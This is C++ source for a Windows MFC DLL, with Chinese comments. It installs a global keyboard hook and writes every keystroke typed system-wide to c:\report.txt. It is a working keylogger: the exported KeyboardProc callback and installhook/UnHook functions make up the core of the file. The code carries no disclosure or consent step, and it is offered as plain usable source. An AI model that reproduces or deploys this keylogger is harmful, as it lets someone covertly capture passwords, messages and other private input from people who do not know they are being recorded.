// hookKB.cpp : Defines the initialization routines for the DLL.
//

#include "stdafx.h"
#include "hookKB.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

//
//	Note!
//
//		If this DLL is dynamically linked against the MFC
//		DLLs, any functions exported from this DLL which
//		call into MFC must have the AFX_MANAGE_STATE macro
//		added at the very beginning of the function.
//
//		For example:
//
//		extern "C" BOOL PASCAL EXPORT ExportedFunction()
//		{
//			AFX_MANAGE_STATE(AfxGetStaticModuleState());
//			// normal function body here
//		}
//
//		It is very important that this macro appear in each
//		function, prior to any calls into MFC.  This means that
//		it must appear as the first statement within the 
//		function, even before any object variable declarations
//		as their constructors may generate calls into the MFC
//		DLL.
//
//		Please see MFC Technical Notes 33 and 58 for additional
//		details.
//

/////////////////////////////////////////////////////////////////////////////
// CHookKBApp
#pragma data_seg(".SHARDAT")
static HHOOK hkb=NULL;
FILE *f1;
#pragma data_seg()
HINSTANCE hins;
BEGIN_MESSAGE_MAP(CHookKBApp, CWinApp)
	//{{AFX_MSG_MAP(CHookKBApp)
		// NOTE - the ClassWizard will add and remove mapping macros here.
		//    DO NOT EDIT what you see in these blocks of generated code!
	//}}AFX_MSG_MAP
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CHookKBApp construction

CHookKBApp::CHookKBApp()
{
	// TODO: add construction code here,
	// Place all significant initialization in InitInstance
}

/////////////////////////////////////////////////////////////////////////////
// The one and only CHookKBApp object

CHookKBApp theApp;
 LRESULT __declspec(dllexport)__stdcall CALLBACK KeyboardProc(int nCode,WPARAM wParam,LPARAM lParam)
 {
	 char ch;
	 if((wParam==VK_SPACE) ||(wParam==VK_RETURN) ||(wParam>=0x2f) &&(wParam<=0x100))
	 {
		 f1=fopen("c:\\report.txt","a+");
		 if(wParam==VK_RETURN)
		 {
			 ch='\n';
			 fwrite(&ch,1,1,f1);
		 }
		 else
		 {
			 BYTE ks[256];
			 GetKeyboardState(ks);
			 WORD w;
			 UINT scan;
			 scan=0;
			 ToAscii(wParam,scan,ks,&w,0);
			 ch=char(w);
			 fwrite(&ch,1,1,f1);
		 }
		 fclose(f1);
	 }
//将键盘消息传递给其他钩子链上的程序
	 LRESULT RetVal=CallNextHookEx(hkb,nCode,wParam,lParam);
	 return RetVal;
 }

//安装键盘钩子
BOOL __declspec(dllexport)__stdcall installhook()
{
	f1=fopen("c:\\report.txt","w");
	fclose(f1);
	hkb=SetWindowsHookEx(WH_KEYBOARD,(HOOKPROC)KeyboardProc,hins,0);
	return TRUE;
}

//卸载键盘钩子
BOOL __declspec(dllexport) UnHook()
{
	BOOL unhooked=UnhookWindowsHookEx(hkb);
	return unhooked;
}

BOOL CHookKBApp::InitInstance() 
{
	// TODO: Add your specialized code here and/or call the base class
	AFX_MANAGE_STATE(AfxGetStaticModuleState());
	hins=AfxGetInstanceHandle();
	return CWinApp::InitInstance();
}

int CHookKBApp::ExitInstance() 
{
	// TODO: Add your specialized code here and/or call the base class
	UnHook();   //卸载键盘钩子

	return CWinApp::ExitInstance();
}
